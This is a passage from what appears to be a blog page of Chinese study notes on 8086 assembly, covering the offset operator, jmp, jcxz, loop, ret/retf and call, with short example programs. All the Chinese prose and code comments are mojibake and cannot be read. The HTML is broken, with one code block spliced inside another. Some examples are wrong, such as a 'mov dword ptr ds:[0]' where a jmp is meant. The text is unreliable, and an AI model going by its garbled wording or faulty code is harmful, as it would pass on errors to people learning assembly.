æ¡ä»¶è½¬ç§»æŒ‡ä»¤ï¼ˆå¦‚ï¼šjmpï¼‰</li><li>æ¡ä»¶è½¬ç§»æŒ‡ä»¤</li><li>å¾ªç¯æŒ‡ä»¤ï¼ˆå¦‚ï¼šloopï¼‰</li><li>è¿‡ç¨‹</li><li>ä¸­æ–­</li></ul><h3 id="9-1-æ“ä½œç¬¦-offset"><a href="#9-1-æ“ä½œç¬¦-offset" class="headerlink" title="9.1 æ“ä½œç¬¦ offset"></a>9.1 æ“ä½œç¬¦ offset</h3><p>æ“ä½œç¬¦ offset ç”±ç¼–è¯‘å™¨å¤„ç†ï¼Œå–å¾—æ ‡å·çš„åç§»åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg<br>codesg segment<br>  start:mov ax,offset start//ç›¸å½“äºmov ax,0<br>  s:mov ax,offset s//ç›¸å½“äºmov ax,3<br>codesg ends<br>end start<br>//startæ‰€æ ‡è®°çš„æŒ‡ä»¤æ˜¯ä»£ç æ®µçš„ç¬¬ä¸€æ¡æŒ‡ä»¤ï¼Œåç§»åœ°å€ä¸º0<br>//sæ‰€æ ‡è®°çš„æŒ‡ä»¤ä¸ºç¬¬äºŒæ¡ï¼Œç¬¬ä¸€æ¡æŒ‡ä»¤é•¿åº¦ä¸º3ä¸ªå­—èŠ‚ï¼Œåˆ™sçš„åç§»åœ°å€ä¸º3<br></code></pre></td></tr></table></figure><p>e.g ä½¿ç¨‹åºåœ¨è¿è¡Œä¸­å°† s å¤„çš„ä¸€æ¡æŒ‡ä»¤å¤åˆ¶åˆ° s0 å¤„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">//å°†så¤„çš„æŒ‡ä»¤å¤åˆ¶åˆ°s0å¤„å°±æ˜¯å°†cs:offset så¤„æ•°æ®å¤åˆ¶åˆ°cs:offset s0<br><br>assume cs:codesg<br>codesg segment<br>s:mov ax,bx//mov ax,bxçš„æœºå™¨ç å 2ä¸ªå­—èŠ‚<br>mov si,offset s<br>mov di,offset s0<br>mov ax,cs:[si]<br>mov cs:[di],ax<br>s0:nop//nopå ä¸€ä¸ªå­—èŠ‚<br>nop<br>codesg ends<br>end s<br></code></pre></td></tr></table></figure><h3 id="9-2-jmp-æŒ‡ä»¤"><a href="#9-2-jmp-æŒ‡ä»¤" class="headerlink" title="9.2 jmp æŒ‡ä»¤"></a>9.2 jmp æŒ‡ä»¤</h3><p>æ— æ¡ä»¶è½¬ç§»æŒ‡ä»¤</p><p>jmp æŒ‡ä»¤è¦ç»™å‡ºä¸¤ç§ä¿¡æ¯ï¼š</p><ul><li>è½¬ç§»çš„ç›®çš„åœ°å€</li><li>è½¬ç§»çš„è·ç¦»ï¼ˆæ®µé—´è½¬ç§»ã€æ®µå†…çŸ­è½¬ç§»ã€æ®µå†…è¿‘è½¬ç§»ï¼‰</li></ul><h3 id="9-3-æ ¹æ®ä½ç§»è¿›è¡Œè½¬ç§»çš„-jmp-æŒ‡ä»¤"><a href="#9-3-æ ¹æ®ä½ç§»è¿›è¡Œè½¬ç§»çš„-jmp-æŒ‡ä»¤" class="headerlink" title="9.3 æ ¹æ®ä½ç§»è¿›è¡Œè½¬ç§»çš„ jmp æŒ‡ä»¤"></a>9.3 æ ¹æ®ä½ç§»è¿›è¡Œè½¬ç§»çš„ jmp æŒ‡ä»¤</h3><ul><li><p>jmp short æ ‡å·ï¼ˆè½¬åˆ°æ ‡å·å¤„æ‰§è¡ŒæŒ‡ä»¤ï¼‰&#x2F;&#x2F;æ®µå†…çŸ­è½¬ç§»</p></li><li><p>CPU åœ¨æ‰§è¡Œ jmp æŒ‡ä»¤æ—¶ä¸éœ€è¦è½¬ç§»çš„ç›®çš„åœ°å€</p></li><li><p><strong>â€œjmp short æ ‡å·â€:åŠŸèƒ½ï¼š(IP)&#x3D;(IP)+8 ä½ä½ç§»</strong></p><ul><li>8ä½ä½ç§»&#x3D;æ ‡å·å¤„çš„åœ°å€-jmp æŒ‡ä»¤åçš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åœ°å€</li><li>short æŒ‡æ˜æ­¤å¤„çš„ä½ç§»ä¸º8ä½ä½ç§»</li><li>8ä½ä½ç§»èŒƒå›´ä¸º-128~127ï¼Œç”¨è¡¥ç è¡¨ç¤º</li><li>8ä½ä½ç§»ç”±ç¼–è¯‘ç¨‹åºåœ¨ç¼–è¯‘æ—¶ç®—å‡º</li></ul></li><li><p><strong>â€œjmp near ptr  æ ‡å·â€:(IP)&#x3D;(IP)+16 ä½ä½ç§»</strong></p><ul><li>16ä½ä½ç§»&#x3D;æ ‡å·å¤„çš„åœ°å€-jmpæŒ‡ä»¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åœ°å€</li><li>near ptr æŒ‡æ˜æ­¤å¤„çš„ä½ç§»ä¸º16ä½ä½ç§»ï¼Œè¿›è¡Œçš„æ˜¯æ®µå†…è¿‘è½¬ç§»</li><li>16ä½ä½ç§»çš„èŒƒå›´ä¸º-32768~32767ï¼Œç”¨è¡¥ç è¡¨ç¤º</li><li>16ä½ä½ç§»ç”±ç¼–è¯‘ç¨‹åºåœ¨ç¼–è¯‘æ—¶ç®—å‡º</li></ul></li></ul><h3 id="9-4-è½¬ç§»çš„ç›®çš„åœ°å€åœ¨æŒ‡ä»¤ä¸­çš„-jmp-æŒ‡ä»¤"><a href="#9-4-è½¬ç§»çš„ç›®çš„åœ°å€åœ¨æŒ‡ä»¤ä¸­çš„-jmp-æŒ‡ä»¤" class="headerlink" title="9.4 è½¬ç§»çš„ç›®çš„åœ°å€åœ¨æŒ‡ä»¤ä¸­çš„ jmp æŒ‡ä»¤"></a>9.4 è½¬ç§»çš„ç›®çš„åœ°å€åœ¨æŒ‡ä»¤ä¸­çš„ jmp æŒ‡ä»¤</h3><p>â€œjmp  far  ptr  æ ‡å·â€å®ç°<strong>æ®µé—´è½¬ç§»ï¼Œåˆç§°ä¸ºè¿œè½¬ç§»</strong>**</p><ul><li>(CS)&#x3D;æ ‡å·æ‰€åœ¨æ®µçš„æ®µåœ°å€ï¼›</li><li>(IP)&#x3D;æ ‡å·åœ¨æ®µä¸­çš„åç§»åœ°å€</li><li>far ptr æŒ‡æ˜äº†æŒ‡ä»¤ç”¨æ ‡å·çš„æ®µåœ°å€å’Œåç§»åœ°å€ä¿®æ”¹ CS å’Œ IP</li></ul><h3 id="9-5-è½¬ç§»åœ°å€åœ¨å¯„å­˜å™¨ä¸­çš„-jmp-æŒ‡ä»¤"><a href="#9-5-è½¬ç§»åœ°å€åœ¨å¯„å­˜å™¨ä¸­çš„-jmp-æŒ‡ä»¤" class="headerlink" title="9.5 è½¬ç§»åœ°å€åœ¨å¯„å­˜å™¨ä¸­çš„ jmp æŒ‡ä»¤"></a>9.5 è½¬ç§»åœ°å€åœ¨å¯„å­˜å™¨ä¸­çš„ jmp æŒ‡ä»¤</h3><p>æ ¼å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp 16ä½reg<br></code></pre></td></tr></table></figure><p>åŠŸèƒ½ï¼š(IP)&#x3D;ï¼ˆ16ä½regï¼‰</p><h3 id="9-6-è½¬ç§»åœ°å€åœ¨å†…å­˜ä¸­çš„-jmp-æŒ‡ä»¤"><a href="#9-6-è½¬ç§»åœ°å€åœ¨å†…å­˜ä¸­çš„-jmp-æŒ‡ä»¤" class="headerlink" title="9.6 è½¬ç§»åœ°å€åœ¨å†…å­˜ä¸­çš„ jmp æŒ‡ä»¤"></a>9.6 è½¬ç§»åœ°å€åœ¨å†…å­˜ä¸­çš„ jmp æŒ‡ä»¤</h3><p>1ï¼‰<strong>jmp  word  ptr   å†…å­˜å•å…ƒåœ°å€ï¼ˆæ®µå†…è½¬ç§»ï¼‰</strong></p><ul><li><p>ä»å†…å­˜å•å…ƒåœ°å€å¤„å¼€å§‹å­˜æ”¾ä¸€ä¸ªå­—ï¼Œæ˜¯è½¬ç§»çš„ç›®çš„åç§»åœ°å€</p></li><li><p>å†…å­˜å•å…ƒåœ°å€å¯ç”¨å¯»å€æ–¹å¼çš„ä»»ä¸€æ ¼å¼ç»™å‡º</p></li><li><pre><code class="assembly">mov ax,0123Hmov ds:[0],axjmp word ptr ds:[0]//æ‰§è¡Œå(IP)=0123Hmov ax,0123Hmov [bx],axjmp word ptr [bx]//æ‰§è¡Œå(IP)=0123H<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><br><br><span class="hljs-number">2</span>ï¼‰**<span class="hljs-keyword">jmp</span>  <span class="hljs-built_in">dword</span>  <span class="hljs-built_in">ptr</span>  å†…å­˜å•å…ƒåœ°å€ï¼ˆæ®µé—´è½¬ç§»ï¼‰**<br><br>- ä»å†…å­˜å•å…ƒå¼€å§‹å­˜æ”¾ä¸¤ä¸ªå­—ï¼Œ**é«˜åœ°å€å¤„çš„å­—æ˜¯è½¬ç§»çš„ç›®çš„æ®µåœ°å€ï¼Œä½åœ°å€æ˜¯åç§»åœ°å€**<br><br>- (<span class="hljs-built_in">CS</span>)=(å†…å­˜å•å…ƒåœ°å€+<span class="hljs-number">2</span>)<br><br>  ï¼ˆ<span class="hljs-built_in">IP</span>ï¼‰=ï¼ˆå†…å­˜å•å…ƒåœ°å€ï¼‰<br><br>- <span class="hljs-string">```</span>assembly<br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0123H</span><br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>:[<span class="hljs-number">0</span>],<span class="hljs-built_in">ax</span><br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[<span class="hljs-number">2</span>],<span class="hljs-number">0</span><br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[<span class="hljs-number">0</span>]<br>  //æ‰§è¡Œå(<span class="hljs-built_in">CS</span>)=<span class="hljs-number">0</span>,(<span class="hljs-built_in">IP</span>)=<span class="hljs-number">0123H</span>,<span class="hljs-built_in">CS</span>:<span class="hljs-built_in">IP</span>æŒ‡å‘<span class="hljs-number">0000</span>:<span class="hljs-number">0123</span><br>  <br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0123H</span><br>  <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">bx</span>],<span class="hljs-built_in">ax</span><br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">bx</span>+<span class="hljs-number">2</span>],<span class="hljs-number">0</span><br>  <span class="hljs-keyword">jmp</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">bx</span>]<br>  //æ‰§è¡Œåï¼Œ(<span class="hljs-built_in">CS</span>)=<span class="hljs-number">0</span>,(<span class="hljs-built_in">IP</span>)=<span class="hljs-number">0123H</span>,<span class="hljs-built_in">CS</span>:<span class="hljs-built_in">IP</span>æŒ‡å‘<span class="hljs-number">0000</span>:<span class="hljs-number">0123</span><br></code></pre></td></tr></table></figure></code></pre></li></ul><p>e.g. ä½¿ jmp æŒ‡ä»¤æ‰§è¡Œåï¼ŒCS:IP æŒ‡å‘ç¨‹åºçš„ç¬¬ä¸€æ¡æŒ‡ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>data segment<br>dd12345678H<br>data ends<br>code segment<br> start:mov ax,data<br> mov ds,ax<br> mov bx,0<br> mov [bx],bx//æˆ–è€… mov [bx],word ptr 0æˆ–è€…mov [bx],offset start<br> //å°†IPè®¾ç½®ä¸º0<br> mov [bx+2],cs//æˆ– mov [bx+2],cs   æˆ– mov [bx+2],seg code<br> //å°†csæ®µåœ°å€æ”¾å…¥å†…å­˜å•å…ƒ<br> jmp dword ptr ds:[0]<br>code ends<br>end start<br>//jmp dword ptr ds:[0]ä¸ºæ®µé—´è½¬ç§»,(CS)=(å†…å­˜å•å…ƒåœ°å€+2),(IP)=(å†…å­˜å•å…ƒåœ°å€)<br>//CS:IPæŒ‡å‘ç¬¬ä¸€æ¡æŒ‡ä»¤,ç¬¬ä¸€æ¡ç¨‹åºåœ°å€ä¸ºcs:0,è®¾ç½®CS:IPæŒ‡å‘cs:0<br></code></pre></td></tr></table></figure><p>e.g 2000:1000  BE  00  06  00  00  00 â€¦â€¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,2000H<br>mov es,ax<br>jmp dword ptr es:[1000H]<br>//(CS)=0006H,(IP)=00BEH<br></code></pre></td></tr></table></figure><h3 id="9-7-jcxz-æŒ‡ä»¤"><a href="#9-7-jcxz-æŒ‡ä»¤" class="headerlink" title="9.7 jcxz æŒ‡ä»¤"></a>9.7 jcxz æŒ‡ä»¤</h3><p>jcxz æŒ‡ä»¤ä¸ºæœ‰<strong>æ¡ä»¶è½¬ç§»æŒ‡ä»¤ï¼Œéƒ½æ˜¯çŸ­è½¬ç§»</strong>ï¼Œåœ¨å¯¹åº”çš„æœºå™¨ç ä¸­åŒ…å«è½¬ç§»çš„ä½ç§»ï¼Œè€Œä¸æ˜¯ç›®çš„åœ°å€ã€‚IPä¿®æ”¹èŒƒå›´ä¸º:-128~127</p><p>æ ¼å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jcxz  æ ‡å·(å¦‚æœ(cx)=0),è½¬ç§»åˆ°æ ‡å·å¤„æ‰§è¡Œ<br>å½“(cx)=0æ—¶,(IP)=(IP)+8ä½ä½ç§»<br></code></pre></td></tr></table></figure><ul><li>8ä½ä½ç§»&#x3D;æ ‡å·å¤„çš„åœ°å€ - jcxz æŒ‡ä»¤åçš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åœ°å€</li><li>8ä½ä½ç§»çš„èŒƒå›´ä¸º-128~127ï¼Œç”¨è¡¥ç è¡¨ç¤º</li></ul><p>â€œ jcxz  æ ‡å· â€åŠŸèƒ½ç›¸å½“äºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">if ((cx)==0) <br>jmp short æ ‡å·<br></code></pre></td></tr></table></figure><p>e.g åˆ©ç”¨ jcxz æŒ‡ä»¤ï¼Œå®ç°åœ¨å†…å­˜ 2000H æ®µä¸­æŸ¥æ‰¾ç¬¬ä¸€ä¸ªå€¼ä¸º 0 çš„å­—èŠ‚ï¼Œæ‰¾åˆ°åå°†å®ƒçš„åç§»åœ°å€å­˜å‚¨åœ¨ dx ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br> start:mov ax,2000H<br> mov ds,ax<br> <br> mov bx,0<br> s:mov ch,0//å°†chå¯„å­˜å™¨æ¸…é›¶ã€‚chå¯„å­˜å™¨è¢«ç”¨ä½œè¾…åŠ©å¯„å­˜å™¨ï¼Œcxå¯„å­˜å™¨ç”±chå’Œclç»„æˆï¼Œç”¨äºå¾ªç¯è®¡æ•°<br> mov cl,[bx]//å°†bxæŒ‡å‘çš„å†…å­˜åœ°å€çš„å†…å®¹é€å…¥clä¸­<br> jcxz ok//if(cx==0),å°±æ˜¯chå’Œclä¸º0<br> inc bx<br> jmp short s<br> <br> ok:mov dx,bx<br> mov ax,4c00h<br> int 21h<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="9-8-loop-æŒ‡ä»¤"><a href="#9-8-loop-æŒ‡ä»¤" class="headerlink" title="9.8 loop æŒ‡ä»¤"></a>9.8 loop æŒ‡ä»¤</h3><p>loop æŒ‡ä»¤ä¸ºå¾ªç¯æŒ‡ä»¤ï¼Œ<strong>æ‰€æœ‰å¾ªç¯æŒ‡ä»¤éƒ½æ˜¯çŸ­è½¬ç§»</strong></p><p>æ ¼å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">loop æ ‡å· (cx)=(cx)-1,å¦‚æœ(cx)ä¸ä¸º0ï¼Œè½¬ç§»åˆ°æ ‡å·å¤„æ‰§è¡Œã€<br>å³ï¼š<br>(cx)=(cx)-1<br>å¦‚æœ(cx)ä¸ä¸º0,(IP)=(IP)+8ä½ä½ç§»<br></code></pre></td></tr></table></figure><ul><li>8ä½ä½ç§»&#x3D;æ ‡å·å¤„åœ°å€ - loop æŒ‡ä»¤åçš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åœ°å€</li><li>8ä½ä½ç§»çš„èŒƒå›´ä¸º-128~127ï¼Œç”¨è¡¥ç è¡¨ç¤º</li></ul><p>â€œ loop â€ç›¸å½“äºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(cx)--<br>if(cx)!=0)<br>jmp short æ ‡å·<br></code></pre></td></tr></table></figure><p>e.g åˆ©ç”¨ loop æŒ‡ä»¤ï¼Œå®ç°åœ¨å†…å­˜ 2000H æ®µä¸­æŸ¥æ‰¾ç¬¬ä¸€ä¸ªå€¼ä¸º 0 çš„å­—èŠ‚ï¼Œå°†åç§»åœ°å€å­˜å‚¨åœ¨ dx ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br> start:mov ax,2000H<br> mov ds,ax<br> mov bx,0<br> s:mov cl,[bx]<br> mov ch,0<br> inc cx<br> inc bx<br> loop s<br> ok:dec bx<br> mov dx,bx//decå’Œincç›¸åï¼Œdec bxè¿›è¡Œæ“ä½œä¸º:(bx)=(bx)-1<br> mov ax,4c00h<br> int 21h<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h1 id="åã€CALLå’ŒRETæŒ‡ä»¤"><a href="#åã€CALLå’ŒRETæŒ‡ä»¤" class="headerlink" title="åã€CALLå’ŒRETæŒ‡ä»¤"></a>åã€CALLå’ŒRETæŒ‡ä»¤</h1><h3 id="10-1-ret-å’Œ-retf"><a href="#10-1-ret-å’Œ-retf" class="headerlink" title="10.1 ret å’Œ retf"></a>10.1 ret å’Œ retf</h3><p>ret æŒ‡ä»¤ç”¨æ ˆä¸­çš„æ•°æ®ï¼Œä¿®æ”¹ IP çš„å†…å®¹ï¼Œä»è€Œå®ç°è½¬ç§»</p><p>retf ä¿®æ”¹ CS å’Œ IP çš„å†…å®¹ï¼Œå®ç°è½¬ç§»</p><p>æ‰§è¡Œ ret æŒ‡ä»¤æ—¶ : ç›¸å½“äºè¿›è¡Œï¼špop  IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(IP)=((ss)*16+(sp))<br>(sp)=(sp)+2<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œ retf æŒ‡ä»¤æ—¶ï¼šç›¸å½“äºè¿›è¡Œï¼špop  IPpop  CS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(IP)=((ss)*16+(sp))<br>(sp)=(sp)+2<br>(CS)=((ss)*16+(sp))<br>(sp)=(sp)+2<br></code></pre></td></tr></table></figure><p>ret æŒ‡ä»¤æ‰§è¡Œåï¼Œ(IP)&#x3D;0,CS:IP æŒ‡å‘ä»£ç æ®µçš„ç¬¬ä¸€æ¡æŒ‡ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>stack segment<br>db 16 dup (0)<br>stack ends<br>code segment<br>mov ax,4c00h<br>int 21h<br> start:mov ax,stack<br> mov ss,ax<br> mov sp,16<br> mov ax,0<br> push ax<br> mov bx,0<br> ret<br>code ends<br>end start<br></code></pre></td></tr></table></figure><p>retf æŒ‡ä»¤æ‰§è¡Œåï¼ŒCS:IP æŒ‡å‘ä»£ç æ®µçš„ç¬¬ä¸€æ¡å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>stack segment<br>db 16 dup (0)<br>stack ends<br>code segment<br>mov ax,4c00h<br>int 21h<br> start:mov ax,stack<br> mov ss,ax<br> mov sp,16<br> mov ax,0<br> push cs<br> push ax<br> mov bx,0<br> retf<br>code ends<br>end start<br></code></pre></td></tr></table></figure><p>e.g å®ç°ä»å†…å­˜ 1000:0000 å¤„å¼€å§‹æ‰§è¡ŒæŒ‡ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>stack segment<br>db 16 dup (0)<br>stack ends<br>code segment<br> start:mov ax,stack<br> mov ss,ax<br> mov sp,16<br> mov ax,1000h<br> push ax<br> mov ax,0<br> push ax<br> retf<br>code ends<br>end start<br>//å…ˆå°†æ®µåœ°å€CSå…¥æ ˆ,å†å°†åç§»åœ°å€IPå…¥æ ˆ<br></code></pre></td></tr></table></figure><h3 id="10-3-æ ¹æ®ä½ç§»è¿›è¡Œè½¬ç§»çš„-call-æŒ‡ä»¤"><a href="#10-3-æ ¹æ®ä½ç§»è¿›è¡Œè½¬ç§»çš„-call-æŒ‡ä»¤" class="headerlink" title="10.3 æ ¹æ®ä½ç§»è¿›è¡Œè½¬ç§»çš„ call æŒ‡ä»¤"></a>10.3 æ ¹æ®ä½ç§»è¿›è¡Œè½¬ç§»çš„ call æŒ‡ä»¤</h3><p>CPU æ‰§è¡Œ call æŒ‡ä»¤æ—¶ï¼Œè¿›è¡Œï¼š</p><ul><li>å°†å½“å‰ IP æˆ– CS å’Œ IP å‹å…¥æ ˆä¸­</li><li>è½¬ç§»</li></ul><p><strong>call   æ ‡å·(å°†å½“å‰ IP å‹æ ˆåï¼Œè½¬åˆ°æ ‡å·å¤„æ‰§è¡ŒæŒ‡ä»¤)</strong></p><p>æ‰§è¡Œ call æŒ‡ä»¤æ—¶ï¼Œè¿›è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">1) (sp)=(sp)-2<br>((ss)*16+(sp))=(IP)<br>2) (IP)=(IP)+16ä½ä½ç§»<br></code></pre></td></tr></table></figure><ul><li>16ä½ä½ç§» &#x3D; æ ‡å·å¤„çš„åœ°å€ - call æŒ‡ä»¤åçš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åœ°å€</li><li>16ä½ä½ç§»çš„èŒƒå›´ä¸º-32768~32767</li></ul><p>æ‰§è¡Œ â€œ call   æ ‡å· â€œæ—¶ï¼Œç›¸å½“äºè¿›è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push IP<br>jmp near ptr æ ‡å·<br></code></pre></td></tr></table></figure><h3 id="10-4-è½¬ç§»çš„ç›®çš„åœ°å€åœ¨æŒ‡ä»¤ä¸­çš„-call-æŒ‡ä»¤"><a href="#10-4-è½¬ç§»çš„ç›®çš„åœ°å€åœ¨æŒ‡ä»¤ä¸­çš„-call-æŒ‡ä»¤" class="headerlink" title="10.4 è½¬ç§»çš„ç›®çš„åœ°å€åœ¨æŒ‡ä»¤ä¸­çš„ call æŒ‡ä»¤"></a>10.4 è½¬ç§»çš„ç›®çš„åœ°å€åœ¨æŒ‡ä»¤ä¸­çš„ call æŒ‡ä»¤</h3><p>â€ call  far  ptr  æ ‡å· â€œ å®ç°æ®µé—´è½¬ç§»</p><p>æ‰§è¡Œæ—¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">1) (sp)=(sp)-2<br>((ss)*16+(sp))=(CS)<br>(sp)=(sp)-2<br>((ss)*16+(sp))=(IP)<br>2) (CS)=æ ‡å·æ‰€åœ¨æ®µçš„æ®µåœ°å€<br>(IP)=æ ‡å·åœ¨æ®µä¸­çš„åç§»åœ°å€<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œâ€ call  far  ptr  æ ‡å· â€œæ—¶ï¼Œç›¸å½“äºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push CS<br>push IP<br>jmp far ptr æ ‡å·<br></code></pre></td></tr></table></figure><h3 id="10-5-è½¬ç§»åœ°å€åœ¨å¯„å­˜å™¨ä¸­çš„-call-æŒ‡ä»¤"><a href="#10-5-è½¬ç§»åœ°å€åœ¨å¯„å­˜å™¨ä¸­çš„-call-æŒ‡ä»¤" class="headerlink" title="10.5 è½¬ç§»åœ°å€åœ¨å¯„å­˜å™¨ä¸­çš„ call æŒ‡ä»¤"></a>10.5 è½¬ç§»åœ°å€åœ¨å¯„å­˜å™¨ä¸­çš„ call æŒ‡ä»¤</h3><p>æ ¼å¼ï¼šcall 16ä½ reg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(sp)=(sp)-2<br>((ss)*16+(sp))=(IP)<br>(IP)=(16ä½reg)<br><br>//ç›¸å½“äº<br>push IP<br>jmp 16ä½reg<br></code></pre></td></tr></table></figure><h3 id="10-6-è½¬ç§»åœ°å€åœ¨å†…å­˜ä¸­çš„-call-æŒ‡ä»¤"><a 